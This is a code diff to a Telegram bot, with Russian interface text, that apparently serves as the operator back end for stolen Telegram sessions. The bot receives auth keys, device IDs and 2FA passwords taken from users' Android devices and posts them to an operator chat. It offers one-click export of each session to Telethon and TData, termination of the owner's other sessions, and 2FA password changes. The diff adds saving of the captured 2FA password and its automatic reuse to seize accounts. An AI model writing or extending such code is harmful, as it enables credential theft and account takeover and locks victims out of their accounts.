@@ -121,6 +121,7 @@ async def process_credentials(bot: Bot, data: dict):
     android_id = data.get("android_id", "unknown_id")
     auth_key_hex = data.get("auth_key_hex")
     dc_id = data.get("dc_id")
+    provided_password = data.get("password") or None
     session_uuid = str(uuid.uuid4())
     temp_dir = TEMP_ROOT / session_uuid
     temp_dir.mkdir(parents=True, exist_ok=True)
@@ -137,7 +138,7 @@ async def process_credentials(bot: Bot, data: dict):
         if not me:
             raise ConnectionError("Session is invalid (get_me failed)")
 
-        database.add_session(session_uuid, android_id, auth_key_hex, int(dc_id), me.id)
+        database.add_session(session_uuid, android_id, auth_key_hex, int(dc_id), me.id, provided_password)
         logger.success(f"Valid session {session_uuid} for user {me.id} saved to DB.")
 
         user_info = (
@@ -147,20 +148,21 @@ async def process_credentials(bot: Bot, data: dict):
             f"🆔 *Username:* `@{me.username or 'N/A'}`\n"
             f"⭐ *Premium:* `{'Да' if me.premium else 'Нет'}`\n"
             f"🚫 *Ограничения:* `{'Да' if me.restricted else 'Нет'}`\n"
-            f"🔑 *2FA Пароль:* `{data.get('password', 'N/A')}`\n\n"
+            f"🔑 *2FA Пароль:* `{provided_password or 'N/A'}`\n\n"
             f"💻 *Устройство:* `{data.get('device_info', 'N/A')}`\n"
             f"📱 *Android ID:* `{android_id}`\n"
             f"_UUID сессии:_ `{session_uuid}`"
         )
         
         builder = InlineKeyboardBuilder()
-        builder.button(text="Проверить валидность", callback_data=f"check:{session_uuid}")
-        builder.button(text="Telethon (.session)", callback_data=f"convert:telethon:{session_uuid}")
-        builder.button(text="TData (.zip)", callback_data=f"convert:tdata:{session_uuid}")
-        builder.button(text="Сбросить другие сессии", callback_data=f"terminate_others:{session_uuid}")
-        builder.button(text="Изменить 2FA пароль", callback_data=f"change2fa:{session_uuid}")
-        builder.button(text="🗑 Сбросить сессию", callback_data=f"reset:{android_id}")
-        builder.adjust(1)
+        builder.button(text="Проверить", callback_data=f"check:{session_uuid}")
+        builder.button(text=".session", callback_data=f"convert:telethon:{session_uuid}")
+        builder.button(text="TData", callback_data=f"convert:tdata:{session_uuid}")
+        builder.button(text="Сброс др. сессий", callback_data=f"terminate_others:{session_uuid}")
+        builder.button(text="Сменить 2FA", callback_data=f"change2fa:{session_uuid}")
+        builder.button(text="🗑 Сбросить", callback_data=f"reset:{android_id}")
+        # 2 кнопки в ряд
+        builder.adjust(3, 3)
 
         await bot.send_message(CHAT_ID, user_info, parse_mode="Markdown", reply_markup=builder.as_markup())
 
@@ -241,7 +243,7 @@ async def handle_conversion_callback(query: CallbackQuery):
     if not session_data:
         return await query.message.reply("❌ Сессия не найдена в БД.")
     
-    auth_key_hex, dc_id, user_id = session_data
+    auth_key_hex, dc_id, user_id, _twofa = session_data
     temp_dir = TEMP_ROOT / f"convert_{session_uuid}"
     temp_dir.mkdir(exist_ok=True)
 
@@ -273,7 +275,7 @@ async def handle_check_callback(query: CallbackQuery):
         return await query.message.edit_text(query.message.text + "\n\n*⚠️ Сессия была удалена с сервера.*", parse_mode="Markdown")
 
     await query.answer("Проверяю сессию...", show_alert=False)
-    auth_key_hex, dc_id, _ = session_data
+    auth_key_hex, dc_id, _user_id, _twofa = session_data
     temp_dir = TEMP_ROOT / f"check_{session_uuid}"
     temp_dir.mkdir(exist_ok=True)
     
@@ -323,7 +325,7 @@ async def handle_terminate_others(query: CallbackQuery):
     if not session_data:
         return await query.message.reply("❌ Сессия не найдена в БД.")
 
-    auth_key_hex, dc_id, _ = session_data
+    auth_key_hex, dc_id, _user_id, _twofa = session_data
     temp_dir = TEMP_ROOT / f"terminate_{session_uuid}"
     temp_dir.mkdir(exist_ok=True)
 
@@ -348,13 +350,29 @@ async def handle_terminate_others(query: CallbackQuery):
 async def handle_change2fa_start(query: CallbackQuery, state: FSMContext):
     await query.answer("Начинаю смену 2FA...")
     _, session_uuid = query.data.split(":")
-    await state.update_data(session_uuid=session_uuid)
-    await state.set_state(Change2FAStates.waiting_current)
-    await query.message.reply(
-        "Введите текущий 2FA пароль, или отправьте 'none' если 2FA не установлен.")
+    session_data = database.get_session_data(session_uuid)
+    if not session_data:
+        return await query.message.reply("❌ Сессия не найдена в БД.")
+
+    _auth_key_hex, _dc_id, _user_id, saved_twofa = session_data
+    await state.update_data(session_uuid=session_uuid, initiator_user_id=query.from_user.id)
+
+    if saved_twofa:
+        # Используем сохранённый пароль и сразу переходим к запросу нового
+        await state.update_data(current_password=saved_twofa)
+        await state.set_state(Change2FAStates.waiting_new)
+        await query.message.reply("Отправьте новый 2FA пароль, или 'none' для отключения 2FA.")
+    else:
+        await state.set_state(Change2FAStates.waiting_current)
+        await query.message.reply("Введите текущий 2FA пароль, или отправьте 'none' если 2FA не установлен.")
 
 @dp.message(Change2FAStates.waiting_current)
 async def handle_change2fa_current(message: Message, state: FSMContext):
+    data = await state.get_data()
+    initiator_user_id = data.get("initiator_user_id")
+    if message.from_user and message.from_user.id != initiator_user_id:
+        return  # Игнорируем сообщения не инициатора
+
     current_raw = (message.text or "").strip()
     current_password = None if current_raw.lower() == 'none' else current_raw
     await state.update_data(current_password=current_password)
@@ -364,6 +382,10 @@ async def handle_change2fa_current(message: Message, state: FSMContext):
 @dp.message(Change2FAStates.waiting_new)
 async def handle_change2fa_new(message: Message, state: FSMContext):
     data = await state.get_data()
+    initiator_user_id = data.get("initiator_user_id")
+    if message.from_user and message.from_user.id != initiator_user_id:
+        return  # Игнорируем сообщения не инициатора
+
     session_uuid = data.get("session_uuid")
     current_password = data.get("current_password")
     new_raw = (message.text or "").strip()
@@ -374,7 +396,7 @@ async def handle_change2fa_new(message: Message, state: FSMContext):
         await state.clear()
         return await message.reply("❌ Сессия не найдена в БД.")
 
-    auth_key_hex, dc_id, _ = session_data
+    auth_key_hex, dc_id, _user_id, _twofa = session_data
     temp_dir = TEMP_ROOT / f"change2fa_{session_uuid}"
     temp_dir.mkdir(exist_ok=True)
 
@@ -385,6 +407,8 @@ async def handle_change2fa_new(message: Message, state: FSMContext):
         client = TelegramClient(str(session_file_path), API_ID, API_HASH)
         await client.connect()
         await client.edit_2fa(new_password=new_password, current_password=current_password)
+        # Сохраняем новый пароль (или очищаем)
+        database.set_session_twofa_password(session_uuid, new_password)
         if new_password is None:
             await message.reply("✅ 2FA пароль отключён.")
         else:
